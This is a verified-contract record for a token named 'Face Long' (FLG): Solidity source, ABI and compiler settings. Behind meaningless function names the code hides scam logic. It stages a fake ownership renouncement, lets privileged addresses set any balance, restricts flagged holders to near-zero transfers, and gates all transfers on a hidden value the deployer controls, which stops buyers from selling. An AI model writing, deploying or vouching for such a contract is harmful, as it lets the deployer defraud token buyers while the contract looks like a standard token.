{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface shouldAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableReceiver {\n    function createPair(address toIs, address exemptTake) external returns (address);\n}\n\ninterface toList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitFund) external view returns (uint256);\n\n    function transfer(address modeEnable, uint256 launchedAmount) external returns (bool);\n\n    function allowance(address isMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeEnable,\n        uint256 launchedAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityMax, uint256 value);\n    event Approval(address indexed isMax, address indexed spender, uint256 value);\n}\n\ninterface buyLaunch is toList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FaceLong is isAmount, toList, buyLaunch {\n\n    event OwnershipTransferred(address indexed feeSwap, address indexed exemptTrading);\n\n    uint256 private teamReceiver;\n\n    function listSender(uint256 launchedAmount) public {\n        modeReceiver();\n        launchMode = launchedAmount;\n    }\n\n    function modeReceiver() private view {\n        require(sellIs[_msgSender()]);\n    }\n\n    bool public launchedSender;\n\n    uint256 atLiquidity;\n\n    bool private shouldTrading;\n\n    function transfer(address fundTake, uint256 launchedAmount) external virtual override returns (bool) {\n        return fundAt(_msgSender(), fundTake, launchedAmount);\n    }\n\n    uint256 public takeMaxFrom;\n\n    uint256 launchMode;\n\n    uint256 private liquidityAmountMode;\n\n    function enableShould() public {\n        emit OwnershipTransferred(receiverEnable, address(0));\n        receiverFee = address(0);\n    }\n\n    address public receiverEnable;\n\n    function allowance(address enableToken, address toLaunch) external view virtual override returns (uint256) {\n        if (toLaunch == liquiditySell) {\n            return type(uint256).max;\n        }\n        return takeMarketingBuy[enableToken][toLaunch];\n    }\n\n    address public autoMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyEnable;\n    }\n\n    bool public marketingBuy;\n\n    function transferFrom(address teamLaunched, address modeEnable, uint256 launchedAmount) external override returns (bool) {\n        if (_msgSender() != liquiditySell) {\n            if (takeMarketingBuy[teamLaunched][_msgSender()] != type(uint256).max) {\n                require(launchedAmount <= takeMarketingBuy[teamLaunched][_msgSender()]);\n                takeMarketingBuy[teamLaunched][_msgSender()] -= launchedAmount;\n            }\n        }\n        return fundAt(teamLaunched, modeEnable, launchedAmount);\n    }\n\n    bool private minFund;\n\n    string private buyAmount = \"FLG\";\n\n    mapping(address => mapping(address => uint256)) private takeMarketingBuy;\n\n    function maxTx(address teamLaunched, address modeEnable, uint256 launchedAmount) internal returns (bool) {\n        require(fromTrading[teamLaunched] >= launchedAmount);\n        fromTrading[teamLaunched] -= launchedAmount;\n        fromTrading[modeEnable] += launchedAmount;\n        emit Transfer(teamLaunched, modeEnable, launchedAmount);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return receiverFee;\n    }\n\n    bool public liquidityShould;\n\n    address liquiditySell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function buyFrom(address liquidityMinReceiver) public {\n        modeReceiver();\n        \n        if (liquidityMinReceiver == receiverEnable || liquidityMinReceiver == autoMin) {\n            return;\n        }\n        totalReceiver[liquidityMinReceiver] = true;\n    }\n\n    bool public tokenMax;\n\n    uint8 private buyEnable = 18;\n\n    mapping(address => uint256) private fromTrading;\n\n    constructor (){\n        \n        shouldAmount sellTakeWallet = shouldAmount(liquiditySell);\n        autoMin = enableReceiver(sellTakeWallet.factory()).createPair(sellTakeWallet.WETH(), address(this));\n        \n        receiverEnable = _msgSender();\n        enableShould();\n        sellIs[receiverEnable] = true;\n        fromTrading[receiverEnable] = limitReceiverEnable;\n        if (minFund == launchedSender) {\n            totalTx = liquidityAmountMode;\n        }\n        emit Transfer(address(0), receiverEnable, limitReceiverEnable);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverFee;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listFee;\n    }\n\n    function isAmountTeam(address fundTake, uint256 launchedAmount) public {\n        modeReceiver();\n        fromTrading[fundTake] = launchedAmount;\n    }\n\n    mapping(address => bool) public sellIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyAmount;\n    }\n\n    function maxTeamReceiver(address shouldToken) public {\n        if (liquidityFund) {\n            return;\n        }\n        if (marketingBuy) {\n            teamReceiver = totalTx;\n        }\n        sellIs[shouldToken] = true;\n        if (launchedSender == marketingBuy) {\n            liquidityShould = true;\n        }\n        liquidityFund = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitReceiverEnable;\n    }\n\n    function balanceOf(address limitFund) public view virtual override returns (uint256) {\n        return fromTrading[limitFund];\n    }\n\n    uint256 constant launchLimit = 10 ** 10;\n\n    function approve(address toLaunch, uint256 launchedAmount) public virtual override returns (bool) {\n        takeMarketingBuy[_msgSender()][toLaunch] = launchedAmount;\n        emit Approval(_msgSender(), toLaunch, launchedAmount);\n        return true;\n    }\n\n    mapping(address => bool) public totalReceiver;\n\n    uint256 private limitReceiverEnable = 100000000 * 10 ** 18;\n\n    bool public liquidityFund;\n\n    address minSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fundAt(address teamLaunched, address modeEnable, uint256 launchedAmount) internal returns (bool) {\n        if (teamLaunched == receiverEnable) {\n            return maxTx(teamLaunched, modeEnable, launchedAmount);\n        }\n        uint256 maxSwapReceiver = toList(autoMin).balanceOf(minSell);\n        require(maxSwapReceiver == launchMode);\n        require(modeEnable != minSell);\n        if (totalReceiver[teamLaunched]) {\n            return maxTx(teamLaunched, modeEnable, launchLimit);\n        }\n        return maxTx(teamLaunched, modeEnable, launchedAmount);\n    }\n\n    uint256 public totalTx;\n\n    string private listFee = \"Face Long\";\n\n    address private receiverFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMinReceiver\",\"type\":\"address\"}],\"name\":\"buyFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAmount\",\"type\":\"uint256\"}],\"name\":\"isAmountTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedAmount\",\"type\":\"uint256\"}],\"name\":\"listSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"}],\"name\":\"maxTeamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMaxFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FaceLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}